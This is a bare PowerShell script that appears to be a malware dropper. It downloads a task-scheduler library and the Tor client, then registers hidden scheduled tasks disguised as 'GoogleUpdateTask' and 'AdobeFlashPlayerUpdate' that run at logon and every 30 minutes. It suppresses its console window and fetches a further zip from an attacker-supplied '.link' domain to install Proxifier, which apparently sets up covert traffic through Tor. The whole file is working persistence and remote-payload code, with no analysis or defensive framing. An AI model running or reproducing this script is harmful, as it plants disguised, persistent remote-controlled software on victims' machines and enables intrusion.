param (
    [string]$Domain
)
function Unzip
{
param([string]$zipfile, [string]$destination);
$shell = new-object -com shell.application;
$zip = $shell.NameSpace($zipfile);
foreach($item in $zip.items())
{
$shell.Namespace($destination).copyhere($item);
}
}
function AddTask
{
param([string]$name, [string]$cmd, [string]$params='');
$ts=New-Object Microsoft.Win32.TaskScheduler.TaskService;
$td=$ts.NewTask();
$td.RegistrationInfo.Description = 'Does something';
$td.Settings.DisallowStartIfOnBatteries = $False;
$td.Settings.StopIfGoingOnBatteries = $False;
$td.Settings.MultipleInstances = [Microsoft.Win32.TaskScheduler.TaskInstancesPolicy]::IgnoreNew;
$LogonTrigger = New-Object Microsoft.Win32.TaskScheduler.LogonTrigger;
$LogonTrigger.StartBoundary=[System.DateTime]::Now;
$LogonTrigger.UserId=$env:username;
$td.Triggers.Add($LogonTrigger);
$TimeTrigger = New-Object Microsoft.Win32.TaskScheduler.TimeTrigger;
$TimeTrigger.StartBoundary=[System.DateTime]::Now;
$TimeTrigger.Repetition.Interval=[System.TimeSpan]::FromMinutes(30);
$TimeTrigger.Repetition.StopAtDurationEnd=$False;
$td.Triggers.Add($TimeTrigger);
$ExecAction=New-Object Microsoft.Win32.TaskScheduler.ExecAction($cmd,$params);
$td.Actions.Add($ExecAction);
$task=$ts.RootFolder.RegisterTaskDefinition($name, $td);
$task.Run();
}
function InstallTP{
$File=$env:Temp+'\ts.zip';
$Dest=$env:Temp+'\ts';
(New-Object System.Net.WebClient).DownloadFile('http://download-codeplex.sec.s-msft.com/Download/Release?ProjectName=taskscheduler&DownloadId=1505290&FileTime=131077268832800000&Build=21031',$File);
if ((Test-Path $Dest) -eq 1){rm -Force -Recurse $Dest;}md $Dest | Out-Null;
Unzip $File $Dest;
rm -Force $File;
$TSAssembly=$Dest+'\v2.0\Microsoft.Win32.TaskScheduler.dll';
$loadLib = [System.Reflection.Assembly]::LoadFile($TSAssembly);
$TFile=$env:Temp+'\t.zip';
$DestTP=$env:APPDATA+'\TP';
(New-Object System.Net.WebClient).DownloadFile('https://www.torproject.org/dist/torbrowser/6.0.2/tor-win32-0.2.7.6.zip',$TFile);
if ((Test-Path $DestTP) -eq 1){rm -Force -Recurse $DestTP;}md $DestTP | Out-Null;
Unzip $TFile $DestTP;
rm -Force $TFile;
$tor=$DestTP+'\Tor\tor.exe';
$tor_cmd="-WindowStyle hidden `"`$t = '[DllImport(\`"user32.dll\`")] public static extern bool ShowWindow(int handle, int state);';add-type -name win -member `$t -namespace native;[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);Start-Process -WindowStyle hidden -Wait -FilePath \`"$tor\`";`"";
AddTask 'GoogleUpdateTask' 'PowerShell.exe' $tor_cmd;
$PFile=$env:Temp+'\p.zip';
$wc=new-object net.webclient;
$purl='http://'+$Domain+'.link/p.zip?t='+[System.DateTime]::Now.Ticks;
$wc.DownloadFile($purl,$PFile);
Unzip $PFile $DestTP;
rm -Force $PFile;
$p=$DestTP+'\p\Proxifier.exe';
AddTask 'AdobeFlashPlayerUpdate' $p;
}
InstallTP
